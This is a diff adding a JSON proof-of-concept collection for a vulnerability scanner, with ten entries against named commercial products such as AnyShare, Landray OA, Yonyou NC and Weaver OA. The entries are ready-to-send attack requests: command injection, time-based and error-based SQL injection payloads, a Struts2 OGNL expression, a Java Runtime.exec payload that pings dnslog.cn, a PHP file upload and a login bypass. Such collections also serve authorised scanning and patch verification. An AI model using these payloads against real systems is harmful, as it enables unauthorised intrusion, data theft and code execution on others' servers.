@@ -1,0 +1,139 @@
+{
+    "name": "通用POC集",
+    "version": "1.0",
+    "pocs": [
+      {
+        "name": "爱数AnyShare命令注入",
+        "method": "POST",
+        "path": "/api/ServiceAgent/start_service",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+          "Content-Type": "application/json"
+        },
+        "json_data": ["`sleep 5`"],
+        "check_type": "time_based",
+        "sleep_seconds": 5,
+        "normal_path": "/api/ServiceAgent/start_service",
+        "inject_path": "/api/ServiceAgent/start_service"
+      },
+      {
+        "name": "科立讯logout.php SQL注入",
+        "method": "GET",
+        "path": "/custom/zx/logout.php",
+        "params": {
+          "sign": "1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(8)))Vgsc)&"
+        },
+        "check_type": "time_based",
+        "sleep_seconds": 8,
+        "normal_path": "/custom/zx/logout.php",
+        "normal_params": {"sign": "1"},
+        "inject_path": "/custom/zx/logout.php",
+        "inject_params": {"sign": "1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(8)))Vgsc)&"}
+      },
+      {
+        "name": "百易云资管系统SQL注入",
+        "method": "POST",
+        "path": "/imaRead.make.php",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": "feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)",
+        "check_type": "keyword",
+        "keyword": "XPATH"
+      },
+      {
+        "name": "AgentSystem Struts2 RCE",
+        "method": "POST",
+        "path": "/login.action",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": "debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse",
+        "check_type": "status_code",
+        "expected_status": 200
+      },
+      {
+        "name": "蓝凌OA命令执行",
+        "method": "POST",
+        "path": "/ekp/data/sys-common/dataxml.tmpl",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": "s_bean=ruleFormulaValidate&script=try { String cmd = \"ping dnslog.cn\"; Process child = Runtime.getRuntime().exec(cmd); } catch (IOException e) { System.err.println(e); }",
+        "check_type": "status_code",
+        "expected_status": 200
+      },
+      {
+        "name": "金和OA SQL注入",
+        "method": "GET",
+        "path": "/C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/",
+        "params": {
+          "id": "1%27+union+all+select+null%2C%28select+%40%40version%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+"
+        },
+        "check_type": "keyword",
+        "keyword": "Microsoft SQL Server"
+      },
+      {
+        "name": "灵当CRM文件上传",
+        "method": "POST",
+        "path": "/crm/WeiXinApp/CallRecordLog/getLogInfo.php",
+        "params": {
+          "userid": "",
+          "gettype": "uploadfile",
+          "uploadfilename": "221.php",
+          "callednumber": "",
+          "sessionvalue": "ca6ee37ed4ea2c709b2d36d1349cacff"
+        },
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Content-Type": "multipart/form-data; boundary=WebKitFormBoundary7MA4YwxkTrZu0gW"
+        },
+        "check_type": "status_code",
+        "expected_status": 200
+      },
+      {
+        "name": "宏景OA DigestDownLoad SQL注入",
+        "method": "GET",
+        "path": "/servlet/DigestDownLoad",
+        "params": {
+          "type": "original",
+          "id": "i8hoHAILh4YkvJtIAayRbgJzqZUPAATTP2HJBPAAATTPfhxbhGm4jOsPAATTP2HJFPAAATTPyM8PAATTP3HJDPAATTP"
+        },
+        "check_type": "status_code",
+        "expected_status": 200
+      },
+      {
+        "name": "用友NC listUserSharingEvents SQL注入",
+        "method": "GET",
+        "path": "/portal/pt/oacoSchedulerEvents/listUserSharingEvents",
+        "params": {
+          "agent": "6') AND (SELECT 4068 FROM (SELECT(SLEEP(5)))Vgsc) AND ('a'='a",
+          "pageId": "login",
+          "sch_ed": "2",
+          "sch_sd": "1"
+        },
+        "check_type": "time_based",
+        "sleep_seconds": 5
+      },
+      {
+        "name": "泛微OA前台登录绕过",
+        "method": "POST",
+        "path": "/dwr/call/plancall/",
+        "params": {
+          "callCount": "1",
+          "c0-id": "1",
+          "c0-scriptName": "WorkflowSubwfSetUtil",
+          "c0-methodName": "LoadTemplateProp",
+          "batchId": "a",
+          "c0-param0": "string:mobilemode",
+          "scriptSessionId": "1",
+          "a": ".swf"
+        },
+        "check_type": "status_code",
+        "expected_status": 200
+      }
+    ]
+  }
